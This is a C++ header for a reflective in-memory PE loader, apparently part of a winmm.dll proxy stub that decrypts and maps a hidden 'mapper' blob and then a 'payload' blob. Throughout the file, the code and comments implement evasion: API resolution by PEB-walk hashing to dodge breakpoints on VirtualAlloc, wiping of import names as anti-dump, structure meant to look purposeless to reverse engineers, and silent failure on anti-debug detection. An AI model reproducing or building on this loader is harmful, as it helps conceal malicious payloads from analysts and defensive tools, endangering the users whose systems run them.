#pragma once
// miniloader.h - GENERIC mini PE loader (no secrets, no overlay).
//
// Used by TWO distinct binaries:
//   * stub_loader.cpp (inside winmm.dll)   -> maps BLOB1 (mapper)
//   * mapper_dllmain.cpp (blob1 itself)    -> maps BLOB2 (payload)
//
// Contains only mechanical PE logic (headers/sections/imports/relocs/
// protections) and CRC32. NO key, magic, name or unlock mechanism here - if
// an RE reads winmm.dll, this part is loader "soup" with no visible purpose.
//
// APIs resolved via apihash (PEB walk + hash) - winmm does NOT have
// VirtualAlloc/ReadFile/etc. in the import table (kills the breakpoint on the
// API that would see the decrypted blob).
//
// `inline` functions in a namespace: each TU that includes it gets its own
// local copy.

#include <windows.h>
#include <cstdint>
#include <cstring>

#include "apihash.h"

namespace miniloader {

// CRC32 (zlib polynomial/init - same as pack_payload.py).
inline uint32_t Crc32(const uint8_t* data, uint32_t n) {
    uint32_t crc = 0xFFFFFFFFu;
    for (uint32_t i = 0; i < n; ++i) {
        crc ^= data[i];
        for (int b = 0; b < 8; ++b)
            crc = (crc >> 1) ^ (0xEDB88320u & (0u - (crc & 1u)));
    }
    return ~crc;
}

// Resolves the blob imports (by name, from the blob itself - nothing
// hardcoded). AFTER resolving, it erases the NAMES (Import by Name + dll
// names) in the mapped image: the IAT keeps the addresses (which the code
// uses via __imp_), but the plaintext of the names disappears from memory
// (anti-dump of whatever is mapped).
inline bool ResolveImports(uint8_t* base, const IMAGE_NT_HEADERS* nt) {
    const IMAGE_DATA_DIRECTORY& dd =
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (dd.VirtualAddress == 0 || dd.Size == 0) return true;
    IMAGE_IMPORT_DESCRIPTOR* desc =
        reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(base + dd.VirtualAddress);
    for (; desc->Name != 0; ++desc) {
        const char* dll_name = reinterpret_cast<const char*>(base + desc->Name);
        HMODULE mod = apihash::GetModuleHandleA()(dll_name);
        if (mod == nullptr)
            mod = apihash::LoadLibraryA()(dll_name);  // fallback (msvcrt etc.)
        if (mod == nullptr) return false;
        IMAGE_THUNK_DATA* names = reinterpret_cast<IMAGE_THUNK_DATA*>(
            base + desc->OriginalFirstThunk);
        IMAGE_THUNK_DATA* iat = reinterpret_cast<IMAGE_THUNK_DATA*>(
            base + desc->FirstThunk);
        if (desc->OriginalFirstThunk == 0) names = iat;  // bound imports
        for (; names->u1.AddressOfData != 0; ++names, ++iat) {
            FARPROC fn = nullptr;
            if (IMAGE_SNAP_BY_ORDINAL64(names->u1.Ordinal)) {
                fn = apihash::GetProcAddress()(mod, reinterpret_cast<LPCSTR>(
                    IMAGE_ORDINAL64(names->u1.Ordinal)));
            } else {
                const IMAGE_IMPORT_BY_NAME* ibn =
                    reinterpret_cast<const IMAGE_IMPORT_BY_NAME*>(
                        base + names->u1.AddressOfData);
                fn = apihash::GetProcAddress()(
                    mod, reinterpret_cast<LPCSTR>(ibn->Name));
            }
            if (fn == nullptr) return false;
            iat->u1.Function = reinterpret_cast<uintptr_t>(fn);
        }
    }
    // anti-dump: erases the import names (hint + string) and the DLL names
    // in the mapped image. The IAT (FirstThunk) is NOT touched - it is where
    // the code fetches the addresses at runtime.
    desc = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(base + dd.VirtualAddress);
    for (; desc->Name != 0; ++desc) {
        char* dll_name = reinterpret_cast<char*>(base + desc->Name);
        std::memset(dll_name, 0, std::strlen(dll_name) + 1);
        if (desc->OriginalFirstThunk == 0) continue;
        IMAGE_THUNK_DATA* names = reinterpret_cast<IMAGE_THUNK_DATA*>(
            base + desc->OriginalFirstThunk);
        for (; names->u1.AddressOfData != 0; ++names) {
            if (IMAGE_SNAP_BY_ORDINAL64(names->u1.Ordinal)) continue;
            IMAGE_IMPORT_BY_NAME* ibn = reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(
                base + names->u1.AddressOfData);
            // hint (2 bytes) + string; erases it all
            std::memset(ibn, 0, 2 + std::strlen(ibn->Name) + 1);
        }
    }
    return true;
}

// DIR64 + ABS relocs (mingw emits a SizeOfBlock==0 terminator block).
inline void ApplyRelocs(uint8_t* base, const IMAGE_NT_HEADERS* nt) {
    const IMAGE_DATA_DIRECTORY& dd =
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (dd.VirtualAddress == 0 || dd.Size == 0) return;
    const intptr_t delta = reinterpret_cast<intptr_t>(base) -
                           static_cast<intptr_t>(nt->OptionalHeader.ImageBase);
    IMAGE_BASE_RELOCATION* blk =
        reinterpret_cast<IMAGE_BASE_RELOCATION*>(base + dd.VirtualAddress);
    while (blk->SizeOfBlock != 0) {
        const uint32_t count = (blk->SizeOfBlock -
                                sizeof(IMAGE_BASE_RELOCATION)) / 2;
        const uint16_t* entries = reinterpret_cast<const uint16_t*>(
            reinterpret_cast<const uint8_t*>(blk) + sizeof(IMAGE_BASE_RELOCATION));
        for (uint32_t i = 0; i < count; ++i) {
            const uint16_t e = entries[i];
            const uint8_t type = static_cast<uint8_t>(e >> 12);
            const uint32_t off = e & 0x0FFFu;
            if (type == IMAGE_REL_BASED_DIR64) {
                *reinterpret_cast<uint64_t*>(base + blk->VirtualAddress + off) +=
                    static_cast<uint64_t>(delta);
            }
            // IMAGE_REL_BASED_ABSOLUTE (0) = no-op
        }
        blk = reinterpret_cast<IMAGE_BASE_RELOCATION*>(
            reinterpret_cast<uint8_t*>(blk) + blk->SizeOfBlock);
    }
}

// Final per-section protections (RW during the map; RX/R afterwards).
inline void ProtectImage(uint8_t* base, const IMAGE_NT_HEADERS* nt) {
    DWORD old = 0;
    apihash::VirtualProtect()(base, nt->OptionalHeader.SizeOfHeaders,
                              PAGE_READONLY, &old);
    const IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        DWORD prot = PAGE_READONLY;
        const DWORD c = sec[i].Characteristics;
        if ((c & IMAGE_SCN_MEM_EXECUTE) != 0)
            prot = (c & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE
                                             : PAGE_EXECUTE_READ;
        else if ((c & IMAGE_SCN_MEM_WRITE) != 0)
            prot = PAGE_READWRITE;
        uint32_t sz = sec[i].Misc.VirtualSize;
        if (sz < sec[i].SizeOfRawData) sz = sec[i].SizeOfRawData;
        if (sz == 0) continue;
        apihash::VirtualProtect()(base + sec[i].VirtualAddress, sz, prot, &old);
    }
    apihash::FlushInstructionCache()(apihash::GetCurrentProcess()(), base,
                                     nt->OptionalHeader.SizeOfImage);
}

using DllEntryFn = BOOL(WINAPI*)(HINSTANCE, DWORD, LPVOID);

// Maps a decrypted blob and calls the entry point (DllMainCRTStartup).
//   expected_crc : blob CRC32 (anti-tamper) - 0 disables the check
//   lp_reserved  : passed as the 3rd arg of the DllMain (parameter channel
//                  stub -> mapper; the CRT passes it through untouched)
inline uint8_t* MiniLoadAndRun(uint8_t* blob, uint32_t blob_size,
                               uint32_t expected_crc, LPVOID lp_reserved) {
    if (expected_crc != 0 && Crc32(blob, blob_size) != expected_crc)
        return nullptr;
    if (blob_size < sizeof(IMAGE_DOS_HEADER) + 0x40) return nullptr;
    const IMAGE_DOS_HEADER* dos =
        reinterpret_cast<const IMAGE_DOS_HEADER*>(blob);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;
    if (dos->e_lfanew + sizeof(IMAGE_NT_HEADERS) > blob_size) return nullptr;
    const IMAGE_NT_HEADERS* nt =
        reinterpret_cast<const IMAGE_NT_HEADERS*>(blob + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;
    if (nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
        return nullptr;
    if (nt->FileHeader.NumberOfSections > 96) return nullptr;

    const uint32_t size_of_image = nt->OptionalHeader.SizeOfImage;
    uint8_t* base = static_cast<uint8_t*>(apihash::VirtualAlloc()(
        reinterpret_cast<void*>(nt->OptionalHeader.ImageBase), size_of_image,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    const bool reloc_needed =
        base != reinterpret_cast<uint8_t*>(nt->OptionalHeader.ImageBase);
    if (base == nullptr) {
        base = static_cast<uint8_t*>(apihash::VirtualAlloc()(
            nullptr, size_of_image, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
        if (base == nullptr) return nullptr;
    }

    std::memcpy(base, blob, nt->OptionalHeader.SizeOfHeaders);
    const IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        uint8_t* dst = base + sec[i].VirtualAddress;
        const uint32_t raw = sec[i].SizeOfRawData;
        const uint32_t vsz = sec[i].Misc.VirtualSize;
        if (raw != 0 && sec[i].PointerToRawData + raw <= blob_size)
            std::memcpy(dst, blob + sec[i].PointerToRawData, raw);
        if (vsz > raw) std::memset(dst + raw, 0, vsz - raw);  // .bss
    }

    if (!ResolveImports(base, nt)) {
        apihash::VirtualFree()(base, 0, MEM_RELEASE);
        return nullptr;
    }
    if (reloc_needed) ApplyRelocs(base, nt);
    ProtectImage(base, nt);

    const DllEntryFn entry = reinterpret_cast<DllEntryFn>(
        base + nt->OptionalHeader.AddressOfEntryPoint);
    if (!entry(reinterpret_cast<HINSTANCE>(base), DLL_PROCESS_ATTACH,
               lp_reserved)) {
        // Entry aborted (e.g.: anti-debug in the mapper detected something and
        // returned FALSE to propagate the silent failure). Frees the mapped image.
        apihash::VirtualFree()(base, 0, MEM_RELEASE);
        return nullptr;
    }
    return base;
}

}  // namespace miniloader
